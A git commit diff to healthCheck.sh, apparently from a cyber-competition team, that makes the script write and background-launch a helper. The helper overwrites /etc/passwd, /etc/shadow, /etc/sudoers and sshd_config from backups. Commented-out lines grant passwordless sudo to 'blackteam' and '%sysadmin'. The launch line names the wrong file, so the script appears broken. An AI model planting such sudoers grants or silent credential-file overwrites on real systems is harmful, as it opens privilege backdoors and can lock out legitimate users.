6f0d3dfa108da88c1874d94aa16e71532e0a15fe
Jayden Tarrance <75499405+J-Tarrance@users.noreply.github.com>
2024-03-12 15:21:07 -0500

    Update healthCheck.sh

--- healthCheck.sh
+++ healthCheck.sh
@@ -24,29 +24,28 @@ done
 #echo "%sysadmin ALL=NOPASSWD:ALL
 #blackteam ALL=NOPASSWD:ALL" >> /etc/sudoers
 
-echo "
+echo "#!/bin/bash
 sleep 10
 
 # Array of important files
-IMPORTANT_FILES=("/etc/passwd" "/etc/shadow" "/etc/group" "/etc/sudoers" "/etc/ssh/sshd_config")
-backupDir="output"
+IMPORTANT_FILES=(\"/etc/passwd\" \"/etc/shadow\" \"/etc/group\" \"/etc/sudoers\" \"/etc/ssh/sshd_config\")
+backupDir=\"output\"
 
-for file in "${IMPORTANT_FILES[@]}"; do
-    filename=$(basename "$file")
-    backup_file="$backupDir/${filename}.pre"
+for file in \"\${IMPORTANT_FILES[@]}\"; do
+    filename=\$(basename \"\$file\")
+    backup_file=\"\$backupDir/\${filename}.pre\"
 
     #check if backup exists
-    if [[ -f "$backup_file" ]]; then
-        echo "Replacing $file with $backup_file..."
-        cp "$backup_file" "$file" && echo "Successfully replaced $file." || echo "Failed to replace $file."
+    if [[ -f \"\$backup_file\" ]]; then
+        echo \"Replacing \$file with \$backup_file...\"
+        cp \"\$backup_file\" \"\$file\" && echo \"Successfully replaced \$file.\" || echo \"Failed to replace \$file.\"
     else 
-        echo "Backup for $file does not exist"
+        echo \"Backup for \$file does not exist\"
     fi
 done
 " > health_check.sh
 
-
-sudo chmod +x health_check.sh
+chmod +x health_check.sh
 
 nohup ./health_check &>health.out & 
 echo "Replacement process initiated."
